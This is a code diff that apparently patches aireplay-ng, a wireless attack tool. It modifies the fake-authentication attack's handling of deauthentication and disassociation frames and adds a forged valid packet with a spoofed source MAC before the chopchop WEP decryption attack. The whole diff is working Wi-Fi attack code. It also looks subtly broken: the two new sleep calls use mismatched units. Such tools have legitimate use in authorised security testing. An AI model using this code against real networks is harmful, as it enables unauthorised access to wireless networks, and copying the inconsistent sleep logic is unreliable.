@@ -1177,6 +1177,7 @@ int do_attack_fake_auth( void )
     int abort;
     int gotack = 0;
     uchar capa[2];
+    int deauth_wait=3;
 
     unsigned char ackbuf[14];
     unsigned char ctsbuf[10];
@@ -1476,13 +1477,14 @@ int do_attack_fake_auth( void )
         {
             /* check if we got an deauthentication packet */
 
-            if( h80211[0] == 0xC0 && state == 4 )
+            if( h80211[0] == 0xC0 ) //removed && state == 4
             {
                 printf("\n");
-                PCT; printf( "Got a deauthentication packet!\n" );
+                PCT; printf( "Got a deauthentication packet! (Waiting %d seconds)\n", deauth_wait );
                 if(opt.npackets == -1) x_send = 4;
                 state = 0;
-                sleep( 3 );
+                read_sleep( deauth_wait * 1000000 );
+                deauth_wait += 2;
                 continue;
             }
 
@@ -1491,10 +1493,11 @@ int do_attack_fake_auth( void )
             if( h80211[0] == 0xA0 && state == 4 )
             {
                 printf("\n");
-                PCT; printf( "Got a disassociation packet!\n" );
+                PCT; printf( "Got a disassociation packet! (Waiting %d seconds)\n", deauth_wait );
                 if(opt.npackets == -1) x_send = 4;
                 state = 0;
-                sleep( 3 );
+                read_sleep( deauth_wait );
+                deauth_wait += 2;
                 continue;
             }
 
@@ -1652,6 +1655,7 @@ int do_attack_fake_auth( void )
                 }
 
                 printf( "Association successful :-)" );
+                deauth_wait = 3;
                 fflush( stdout );
 
                 tt = time( NULL );
@@ -2465,12 +2469,18 @@ int do_attack_chopchop( void )
     unsigned long crc_mask;
     unsigned char *chopped;
 
+    uchar packet[4096];
+
     time_t tt;
     struct tm *lt;
     struct timeval tv;
     struct timeval tv2;
     struct pcap_file_header pfh_out;
     struct pcap_pkthdr pkh;
+
+
+    if(getnet(NULL, 1, 0) != 0)
+        return 1;
 
     srand( time( NULL ) );
 
@@ -2479,6 +2489,26 @@ int do_attack_chopchop( void )
 
     if( (unsigned)caplen > sizeof(srcbuf) || (unsigned)caplen > sizeof(h80211) )
         return( 1 );
+
+    if( opt.r_smac_set == 1 )
+    {
+        //handle picky APs (send one valid packet before all the invalid ones)
+        bzero(packet, sizeof(packet));
+
+        memcpy( packet, NULL_DATA, 24 );
+        memcpy( packet +  4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6 );
+        memcpy( packet + 10, opt.r_smac,  6 );
+        memcpy( packet + 16, opt.f_bssid, 6 );
+
+        packet[0] = 0x08; //make it a data packet
+        packet[1] = 0x41; //set encryption and ToDS=1
+
+        memcpy( packet+24, h80211+24, caplen-24);
+
+        if( send_packet( packet, caplen ) != 0 )
+            return( 1 );
+        //done sending a correct packet
+    }
 
     /* Special handling for spanning-tree packets */
     if ( memcmp( h80211 +  4, SPANTREE, 6 ) == 0 ||
@@ -5333,7 +5363,14 @@ usage:
 
     //if there is no -h given, use default hardware mac
     if( maccmp( opt.r_smac, NULL_MAC) == 0 )
+    {
         memcpy( opt.r_smac, dev.mac_out, 6);
+        if(opt.a_mode != 4)
+        {
+            printf("No source MAC (-h) specified. Using the device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\n",
+                    dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5]);
+        }
+    }
 
     if( maccmp( opt.r_smac, dev.mac_out) != 0 && maccmp( opt.r_smac, NULL_MAC) != 0)
     {
